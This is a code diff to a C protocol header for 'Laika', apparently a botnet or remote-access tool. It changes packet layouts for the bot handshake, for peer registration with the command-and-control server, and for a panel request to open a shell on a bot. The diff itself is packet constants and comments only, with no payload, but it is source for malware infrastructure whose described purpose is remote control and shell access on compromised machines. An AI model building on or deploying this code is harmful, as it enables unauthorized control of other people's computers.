@@ -9,7 +9,8 @@
 #define LAIKA_MAX_PKTSIZE 4096
 
 #define LAIKA_HOSTNAME_LEN 64
-#define LAIKA_IPV4_LEN 16
+#define LAIKA_IPV4_LEN INET_ADDRSTRLEN
+#define LAIKA_INET_LEN INET_ADDRSTRLEN
 
 #define LAIKA_SHELL_DATA_MAX_LENGTH 256
 
@@ -45,7 +46,7 @@ enum {
     *   uint8_t minorVer;
     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- freshly generated pubKey to encrypt decrypted nonce with
     *   char hostname[LAIKA_HOSTNAME_LEN]; -- can be empty (ie. all NULL bytes)
-    *   char ipv4[LAIKA_IPV4_LEN]; -- can be empty (ie. all NULL bytes)
+    *   char inet[LAIKA_INET_LEN]; -- can be empty (ie. all NULL bytes)
     */
     LAIKAPKT_HANDSHAKE_RES,
     /* layout of LAIKAPKT_HANDSHAKE_RES:
@@ -72,6 +73,7 @@ enum {
     /* layout of LAIKAPKT_AUTHENTICATED_ADD_PEER_RES
     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
     *   char hostname[LAIKA_HOSTNAME_LEN];
+    *   char inet[LAIKA_INET_LEN];
     *   char ipv4[LAIKA_IPV4_LEN];
     *   uint8_t peerType;
     */
@@ -80,7 +82,7 @@ enum {
     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
     *   uint8_t peerType;
     */
-    LAIKAPKT_AUTHENTICATED_SHELL_OPEN_REQ, /* panel requesting cnc open a shell on bot */
+    LAIKAPKT_AUTHENTICATED_SHELL_OPEN_REQ, /* panel requesting cnc open a shell on bot. there is no response packet, shell is assumed to be open */
     /* layout of LAIKAPKT_AUTHENTICATE_OPEN_SHELL_REQ
     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
     */
